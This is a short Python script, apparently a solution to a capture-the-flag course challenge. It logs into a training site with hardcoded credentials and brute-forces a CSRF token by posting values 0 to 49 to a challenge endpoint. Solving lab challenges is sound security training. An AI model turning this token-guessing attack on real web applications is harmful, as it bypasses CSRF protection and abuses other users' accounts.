import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/user/csrfchallengefive/plusplus"
for x in range(0,50):
    postData = {"userId":"80ab77a6722bdca67260da9e7ef0bbc8daf5a683",
                "csrfToken":"%d" % (x)}
    response2 = session.post(targetUrl, data=postData)
    print(response2.text)
